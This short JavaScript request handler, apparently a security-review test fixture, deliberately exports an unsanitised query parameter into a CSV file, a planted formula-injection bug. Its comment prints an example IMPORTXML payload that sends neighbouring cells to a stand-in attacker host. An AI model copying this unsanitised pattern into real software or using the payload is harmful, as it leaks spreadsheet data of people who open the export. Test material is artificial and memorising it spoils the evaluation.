import { stringify } from "csv-stringify/sync";

// PLANTED BUG (P-CSV-FORMULA, #1273): the request's `label` is serialized straight into a CSV
// export. A cell beginning `=`, `+`, `-`, `@`, tab or CR is executed as a FORMULA when a colleague
// opens the file in Excel or Sheets, so `=IMPORTXML("https://attacker.tld?d="&A1,"//a")` ships the
// neighbouring rows off-host. Review tier: taint-gated, the AST proves the request value reaches
// the serializer with no formula-prefix neutralization.
export default function handler(req, res) {
  const csv = stringify([{ label: req.query.label, count: 1 }], { header: true });
  res.setHeader("Content-Type", "text/csv");
  res.status(200).send(csv);
}
